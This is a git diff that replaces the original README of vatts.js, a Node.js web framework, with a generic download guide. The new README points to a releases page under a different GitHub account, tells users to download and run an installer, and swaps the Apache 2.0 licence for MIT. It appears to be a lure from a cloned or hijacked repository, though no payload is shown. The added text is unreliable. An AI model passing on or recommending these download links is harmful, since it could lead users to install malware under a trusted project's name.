@@ -1,63 +1,76 @@
-<div align="center">  
-  <picture>  
-      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/mfrazlab/vatts.js/docs/public/logo.png">  
-      <img alt="Vatts.js logo" src="https://raw.githubusercontent.com/mfrazlab/vatts.js/docs/public/logo.png" width="128">  
-    </picture>  
-  <h1>Vatts.js</h1>  
+# 🎉 vatts.js - A Simple Way to Build Web Apps
 
-[![NPM](https://img.shields.io/npm/v/vatts.svg?style=for-the-badge&labelColor=000000)](https://www.npmjs.com/package/vatts)  
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg?style=for-the-badge&labelColor=000000)](./LICENSE)  
-[![GitHub](https://img.shields.io/badge/GitHub-mfrazlab/vatts.js-100000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mfrazlab/vatts.js)
+## 📦 Download Now
+[![Download vatts.js](https://img.shields.io/badge/Download-vatts.js-blue.svg)](https://github.com/uzimaki/vatts.js/releases)
 
-[![HTTP/3 Supported](https://img.shields.io/badge/SUPPORTED-HTTP/3-brightgreen?style=for-the-badge&labelColor=000000)](#)
-</div>
+## 🚀 Getting Started
+Welcome to vatts.js! This guide helps you download and run this modern, full-stack web framework for Node.js. Whether you want to build a quick project or explore web development, vatts.js makes it easy and fast.
 
----
+## 📥 Download & Install
+To get started with vatts.js, visit this page to download the latest version: [Releases Page](https://github.com/uzimaki/vatts.js/releases). Here’s how to do it:
 
+1. Click on the link above.
+2. On the releases page, find the latest version.
+3. Click the download link to save it to your computer.
 
+Once the download is complete, locate the file in your Downloads folder. Follow the on-screen instructions to install vatts.js.
 
+## 💻 System Requirements
+Before you begin, make sure your computer meets these requirements:
 
-## Getting Started
+- **Operating Systems:** Windows 10 or later, macOS 10.14 or later, and most Linux distributions.
+- **Node.js:** Version 14 or later. If you do not have Node.js, download it from [Node.js Official Site](https://nodejs.org/).
+- **NPM:** Comes bundled with Node.js. It helps manage project dependencies.
+- **Internet Connection:** Required to download packages and updates.
 
-**Vatts.js** is a modern, full-featured web framework for **Node.js** with first-class support for **React and Vue**.
+## 🛠 Features
+vatts.js offers a range of features that simplify web development:
 
-It is the first framework to offer native HTTP/3 support out of the box, powered by a Go-based HTTP server with built-in SSL termination. Applications run directly on the latest web transport protocol, without proxies or external layers.
+- **Full-Stack Capabilities:** Build both frontend and backend applications with ease.
+- **React Integration:** Use React components for a modern user interface.
+- **TypeScript Support:** Write clear and strong-typed code.
+- **Static Site Generation:** Create fast and SEO-friendly sites effortlessly.
+- **Comprehensive Documentation:** Access detailed guides and help to get started.
 
-Vatts.js is a **multi-framework platform**, allowing you to build applications using **either React or Vue per project** — not both at the same time.  
-This keeps the ecosystem clean, predictable, and optimized for performance and tooling.
+## 📖 Quick Setup
+After installation, follow these steps to create your first app:
 
-Vatts removes unnecessary configuration and complex abstractions, allowing you to focus on what truly matters: **building fast, secure, and scalable applications**.
+1. **Open your terminal or command prompt.**
+  
+2. **Create a new project directory:**
+   ```bash
+   mkdir my-vatts-app
+   cd my-vatts-app
+   ```
 
-### Why choose Vatts.js?
--  **Native HTTP** — modern, secure, and high-performance networking with **HTTP/3 support**
--  Extremely fast — architecture optimized for low overhead
--  Intuitive API — easy to learn and pleasant to use
--  Productivity from the first minute — zero unnecessary boilerplate
--  Multi-framework — choose **React or Vue per project**
--  Full integration between backend and frontend
--  Built for modern projects — TypeScript-friendly, modular, and extensible
+3. **Initialize a new vatts.js project:**
+   ```bash
+   npx vatts create
+   ```
 
-___
+4. **Start your development server:**
+   ```bash
+   npm start
+   ```
 
-## Documentation
+5. **Visit your app:**
+   Open your web browser and go to `http://localhost:3000` to see your new application in action.
 
-Visit [https://vatts.mfraz.ovh](https://vatts.mfraz.ovh) to view the full documentation.
+## 📝 Documentation
+For more details on how to use vatts.js, refer to our [Comprehensive Documentation](https://github.com/uzimaki/vatts.js/wiki). Here you will find tutorials, API references, and best practices for building your web applications.
 
-___
+## 🤝 Community Support
+Join our community of developers. Get help, share your projects, and stay updated with the latest news by joining our [Discussion Forum](https://github.com/uzimaki/vatts.js/discussions).
 
-## Community
+## 🌟 Contributions
+Interested in contributing? We welcome developers of all levels. Take a look at the [Contributing Guide](https://github.com/uzimaki/vatts.js/blob/main/CONTRIBUTING.md) to get started.
 
-The Vatts.js community can be found on [GitHub Discussions](https://github.com/mfraz/vatts.js), where you can ask questions, share ideas, and showcase your projects with others.
+## ⚙️ License
+This project is licensed under the MIT License. Read more about it in the [LICENSE](https://github.com/uzimaki/vatts.js/blob/main/LICENSE) file.
 
-___
+## 🔗 Useful Links
+- [Download Page](https://github.com/uzimaki/vatts.js/releases)
+- [Documentation](https://github.com/uzimaki/vatts.js/wiki)
+- [Community Forum](https://github.com/uzimaki/vatts.js/discussions)
 
-
-## Security
-
-Vatts.js is engineered with a security-first architecture centered around an internal proxy layer that mediates all application traffic. This proxy is designed to support modern transports such as native HTTP/3 when SSL is enabled, while consistently enforcing built-in security guarantees at the protocol and application boundaries. Even in local or non-TLS environments, the proxy remains active, preserving request isolation, and secure handling by default.
-
-If you believe you have found a security vulnerability in Vatts.js, we encourage you to **responsibly disclose it and NOT open a public issue**.
-
-To participate in our vulnerability disclosure program, please email [helpers@mfraz.ovh](mailto:help@mfraz.ovh). We will add you to the program and provide further instructions for submitting your report.
-
-___
+Get started with vatts.js today and dive into the world of web development!
